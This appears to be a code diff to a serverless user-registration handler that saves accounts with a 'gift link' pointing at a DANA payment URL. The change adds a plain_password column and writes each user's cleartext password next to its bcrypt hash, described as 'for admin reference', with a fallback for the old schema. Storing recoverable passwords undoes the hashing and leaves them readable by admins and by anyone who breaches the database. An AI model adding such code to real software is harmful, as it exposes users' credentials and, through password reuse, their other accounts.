@@ -34,10 +34,20 @@ export const onRequestPost = async (context) => {
     // Hash password
     const hash = await bcrypt.hash(password, 10);
 
-    // Insert user with gift link
+    // Insert user with gift link and plain password (for admin reference)
     const link = gift_link || 'https://link.dana.id/kaget/default';
     
-    await pool.query('INSERT INTO users (username, password_hash, gift_link) VALUES ($1, $2, $3)', [username, hash, link]);
+    // Try to insert with plain_password, fallback to old schema if column doesn't exist (though migration should be run)
+    try {
+      await pool.query('INSERT INTO users (username, password_hash, gift_link, plain_password) VALUES ($1, $2, $3, $4)', [username, hash, link, password]);
+    } catch (err) {
+      // Fallback for old schema if migration hasn't run yet
+      if (err.message.includes('plain_password')) {
+         await pool.query('INSERT INTO users (username, password_hash, gift_link) VALUES ($1, $2, $3)', [username, hash, link]);
+      } else {
+        throw err;
+      }
+    }
     
     // Close connection (serverless)
     context.waitUntil(pool.end());
